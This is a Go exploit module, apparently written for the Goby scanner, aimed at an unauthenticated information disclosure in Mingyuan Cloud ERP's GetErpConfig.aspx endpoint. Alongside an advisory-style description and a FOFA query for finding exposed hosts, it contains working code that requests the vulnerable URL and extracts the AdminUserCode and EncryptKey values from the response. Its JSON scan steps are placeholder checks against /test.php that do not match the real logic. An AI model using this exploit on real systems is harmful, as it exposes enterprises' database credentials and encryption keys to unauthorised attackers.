package exploits

import (
	"errors"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Mingyuan-Yun-ERP /GetErpConfig.aspx Information Disclosure Vulnerability",
    "Description": "<p>Relying on the powerful functions of Mingyuan Cloud ERP system, Mingyuan Cloud ERP report service helps enterprises achieve comprehensive management and in-depth analysis of data through data collection, data analysis, report generation and data visualization. The service supports a variety of custom report and chart types to meet the different data management needs of enterprises.  </p><p>There is an information leakage vulnerability in the GetErpConfig.aspx interface of Mingyuan Cloud ERP Report Service, which can be exploited by an unauthenticated remote attacker to obtain sensitive configuration information of the internal database, resulting in an extremely insecure system.</p>",
    "Product": "Mingyuan-Yun-ERP",
    "Homepage": "http://www.myunke.com/",
    "DisclosureDate": "2024-10-21",
    "PostTime": "2024-10-22",
    "Author": "202205566302@smail.xtu.edu.cn",
    "FofaQuery": "body=\"报表服务已正常运行\" && header=\"ASP.NET\" && header=\"X-Aspnet-Version\"",
    "GobyQuery": "body=\"报表服务已正常运行\" && header=\"ASP.NET\" && header=\"X-Aspnet-Version\"",
    "Level": "0",
    "Impact": "<p>There is an information leakage vulnerability in the GetErpConfig.aspx interface of Mingyuan Cloud ERP Report Service, which can be exploited by an unauthenticated remote attacker to obtain sensitive configuration information of the internal database, resulting in an extremely insecure system.</p>",
    "Recommendation": "<p>1. Set access policies and whitelist access through security devices such as firewalls. </p><p>2. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://axsec.blog.csdn.net/article/details/143116472"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "default",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Information Disclosure"
    ],
    "VulType": [
        "Information Disclosure"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "5.0",
    "Translation": {
        "CN": {
            "Name": "明源云ERP /GetErpConfig.aspx 信息泄露漏洞",
            "Product": "明源云-ERP",
            "Description": "<p>明源云ERP报表服务依托于明源云ERP系统的强大功能，通过数据采集、数据分析、报表生成和数据可视化等功能，帮助企业实现数据的全面管理和深入分析。该服务支持多种自定义报表和图表类型，满足企业不同的数据管理需求。&nbsp;</p><p>明源云ERP报表服务 GetErpConfig.aspx 接口存在信息泄露漏洞，未经身份验证的远程攻击者可利用此漏洞获取内部数据库敏感配置信息，导致系统处于极不安全的状态。<br></p>",
            "Recommendation": "<p>1、通过防火墙等安全设备设置访问策略，设置白名单访问。&nbsp;</p><p>2、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>明源云ERP报表服务 GetErpConfig.aspx 接口存在信息泄露漏洞，未经身份验证的远程攻击者可利用此漏洞获取内部数据库敏感配置信息，导致系统处于极不安全的状态。<br></p>",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露"
            ]
        },
        "EN": {
            "Name": "Mingyuan-Yun-ERP /GetErpConfig.aspx Information Disclosure Vulnerability",
            "Product": "Mingyuan-Yun-ERP",
            "Description": "<p>Relying on the powerful functions of Mingyuan Cloud ERP system, Mingyuan Cloud ERP report service helps enterprises achieve comprehensive management and in-depth analysis of data through data collection, data analysis, report generation and data visualization. The service supports a variety of custom report and chart types to meet the different data management needs of enterprises.&nbsp;&nbsp;</p><p>There is an information leakage vulnerability in the GetErpConfig.aspx interface of Mingyuan Cloud ERP Report Service, which can be exploited by an unauthenticated remote attacker to obtain sensitive configuration information of the internal database, resulting in an extremely insecure system.<br></p>",
            "Recommendation": "<p>1. Set access policies and whitelist access through security devices such as firewalls.&nbsp;</p><p>2. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>There is an information leakage vulnerability in the GetErpConfig.aspx interface of Mingyuan Cloud ERP Report Service, which can be exploited by an unauthenticated remote attacker to obtain sensitive configuration information of the internal database, resulting in an extremely insecure system.<br></p>",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9962"
}`
	postOrGet_csagdahsuyddasygdashcygaugbcgtkasgjcbvatuycgbsagtuyhscxgtyhkanbsjcgygfdat := func(hostInfo *httpclient.FixUrl, fileUrl string) (string, error) {
		respTxt := ""
		requestConfig := httpclient.NewGetRequestConfig(fileUrl)
		requestConfig.VerifyTls = false
		requestConfig.FollowRedirect = false
		resp, err := httpclient.DoHttpRequest(hostInfo, requestConfig)
		if err != nil || resp.StatusCode != 200 {
			err = errors.New("failed to read file")
			return "", err
		}
		respTxt = resp.RawBody
		// 注意：返回值为（最终要返回的读取结果，错误）
		return respTxt, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 此处需要修改：设置成功后的vulurl
			vulURL := "/service/Mysoft.Report.Web.Service.Base/GetErpConfig.aspx?erpKey=erp60 "
			// 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件
			defaultModeMap := map[string]string{
				"/service/Mysoft.Report.Web.Service.Base/GetErpConfig.aspx?erpKey=erp60": "EncryptHeadName",
			}
			// 函数继承
			uploadFileFunc := postOrGet_csagdahsuyddasygdashcygaugbcgtkasgjcbvatuycgbsagtuyhscxgtyhkanbsjcgygfdat

			// 请注意：后续代码为模板代码，非特殊情况，无需更改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			for fileUrl, fileText := range defaultModeMap {
				resp, err := uploadFileFunc(u, fileUrl)
				if err != nil {
					continue
				}
				if strings.Contains(resp, fileText) {
					// 设置VULURL
					ss.VulURL = u.HostInfo + vulURL
					return true
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var fileUrl string
			var fileText string
			mode := goutils.B2S(ss.Params["mode"])

			// 此处需要修改：字典键为用户选择读取文件的类型，值是一个数组，分别为请求的URL地址，返回包判断成功的条件
			defaultModeMap := map[string][2]string{
				"default": {"/service/Mysoft.Report.Web.Service.Base/GetErpConfig.aspx?erpKey=erp60", "EncryptHeadName"},
			}
			// 此处需要修改：函数继承
			uploadFileFunc := postOrGet_csagdahsuyddasygdashcygaugbcgtkasgjcbvatuycgbsagtuyhscxgtyhkanbsjcgygfdat

			// 请注意，后续代码为模板固化，正常情况下均无需修改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			if mode == "default" {
				if _, ok := defaultModeMap[mode]; ok {
					fileUrl = defaultModeMap[mode][0]
					fileText = defaultModeMap[mode][1]
				} else {
					expResult.Success = false
					return expResult
				}
				resp, err := uploadFileFunc(expResult.HostInfo, fileUrl)
				if err != nil || (!strings.Contains(resp, fileText)) {
					expResult.Success = false
					return expResult
				}
				pattern := `"AdminUserCode":"((.|\n)*?)",`
				// 编译正则表达式
				re := regexp.MustCompile(pattern)
				if !re.MatchString(resp) {
					expResult.Success = true
					expResult.Output = resp
					return expResult
				}
				// 在文本中查找匹配项
				match := re.FindStringSubmatch(resp)
				expResult.Output = "Key message :\r\nAdminUserCode = '" + match[1] + "'"

				pattern = `"EncryptKey":"((.|\n)*?)",`
				// 编译正则表达式
				re = regexp.MustCompile(pattern)
				if !re.MatchString(resp) {
					expResult.Success = true
					expResult.Output = resp
					return expResult
				}
				// 在文本中查找匹配项
				match = re.FindStringSubmatch(resp)
				expResult.Output += "\r\nEncryptKey = '" + match[1] + "'"

				expResult.Output += "\r\n\r\nThe complete content :\r\n" + resp
				expResult.Success = true
				return expResult
			}
			expResult.Success = false
			return expResult
		},
	))
}
